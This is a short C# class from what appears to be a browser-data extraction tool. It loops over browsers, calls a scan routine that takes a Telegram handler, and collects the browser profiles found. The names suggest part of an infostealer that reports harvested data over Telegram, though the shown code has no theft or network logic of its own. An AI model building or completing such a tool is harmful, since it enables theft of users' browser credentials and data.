using System.Collections.Generic;
using DataExtractor.Core.Models;

namespace DataExtractor.Core.Handlers;

public class DataScanner
{
	public void Scanning(List<MyBrowser> myBrowsers, TelegramHandler telegramHandler, ConfigData configData)
	{
		configData.BrowserProfiles.Clear();
		foreach (MyBrowser myBrowser in myBrowsers)
		{
			myBrowser.Scan(telegramHandler);
			foreach (BrowserProfile profile in myBrowser.Profiles)
			{
				configData.BrowserProfiles.Add(profile);
			}
		}
	}
}
